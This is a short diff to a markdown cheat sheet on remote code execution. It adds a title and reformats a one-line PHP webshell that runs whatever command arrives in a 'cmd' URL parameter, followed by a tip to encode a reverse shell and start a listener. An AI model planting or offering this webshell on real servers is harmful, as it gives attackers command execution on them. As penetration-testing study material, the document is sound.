@@ -1,3 +1,5 @@
+# Remote Code Execution (RCE)
+
 ## Ways to achieve RCE:
 
 #### 1: Webshells
@@ -16,6 +18,6 @@
 
 ## PHP Webshell example:
 
-### <?PHP echo system($_GET['cmd']); ?>
+    <?php echo system($_GET['cmd']); ?>
 
 #### Write reverse shell (URL Encoded, or Base64 encoded) then set up listener and GG!
